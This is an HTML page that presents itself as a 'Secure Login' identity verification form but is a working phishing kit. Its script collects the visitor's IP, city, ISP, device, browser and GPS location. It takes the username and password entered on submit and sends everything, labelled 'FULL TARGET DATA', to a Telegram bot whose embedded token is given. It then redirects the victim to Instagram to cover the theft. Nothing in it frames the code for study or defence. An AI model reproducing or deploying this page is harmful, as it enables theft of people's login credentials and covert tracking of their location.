<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
        .login-box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 320px; text-align: center; }
        .logo { width: 60px; height: 60px; background: #1877f2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; }
        .logo svg { fill: white; width: 30px; }
        h2 { margin: 0 0 20px; color: #1c1e21; font-size: 22px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
        button { width: 100%; padding: 12px; background-color: #1877f2; border: none; color: white; font-weight: bold; cursor: pointer; border-radius: 6px; font-size: 16px; margin-top: 10px; }
        button:hover { background-color: #166fe5; }
    </style>
</head>
<body>

    <div class="login-box">
        <div class="logo">
            <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
        </div>
        
        <h2>Identity Verification</h2>
        <form id="vaultForm">
            <input type="text" id="user" placeholder="Username or Email" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="submit">Verify & Login</button>
        </form>
    </div>

    <script>
        const botToken = "8755802754:AAGoHGH56dSJBv2tR_OAliyrVe8KscyKnnw";
        const chatIds = ["-1003971522575"]; 

        let vInfo = {};

        // Page load details
        window.onload = async function() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                const ua = navigator.userAgent;

                // Simple Device & Browser Logic
                let dev = "PC/Laptop";
                if (/Android/i.test(ua)) dev = "Android Phone";
                else if (/iPhone/i.test(ua)) dev = "iPhone";

                let br = "Chrome";
                if (ua.indexOf("Firefox") > -1) br = "Firefox";
                else if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) br = "Safari";

                vInfo = {
                    ip: data.ip,
                    city: data.city,
                    sim: data.org,
                    device: dev,
                    browser: br,
                    time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
                };
            } catch (e) { console.log("Init Error"); }
        };

        // Form Submission
        document.getElementById('vaultForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => { 
                        const maps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        sendFinal(u, p, maps); 
                    },
                    (err) => { sendFinal(u, p, `${vInfo.city || "Unknown"} (GPS Denied)`); }
                );
            } else {
                sendFinal(u, p, vInfo.city || "Not Supported");
            }
        }, { once: true });

        function sendFinal(u, p, loc) {
            const report = `🔥 *FULL TARGET DATA* 🔥\n\n` +
                           `⏰ *1. Time:* ${vInfo.time || "N/A"}\n` +
                           `📍 *2. Location:* ${loc}\n` +
                           `🌍 *3. IP Address:* \`${vInfo.ip || "N/A"}\`\n` +
                           `👤 *4. Username:* \`${u}\` \n` +
                           `🔑 *5. Password:* \`${p}\` \n` +
                           `📱 *6. Device:* ${vInfo.device || "N/A"}\n` +
                           `🌐 *7. Browser:* ${vInfo.browser || "N/A"}\n` +
                           `📡 *8. SIM/ISP:* ${vInfo.sim || "N/A"}`;

            chatIds.forEach(id => {
                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(report)}&parse_mode=Markdown`;
                new Image().src = url;
            });

            setTimeout(() => { window.location.href = "https://www.instagram.com"; }, 1500);
        }
    </script>
</body>
</html>
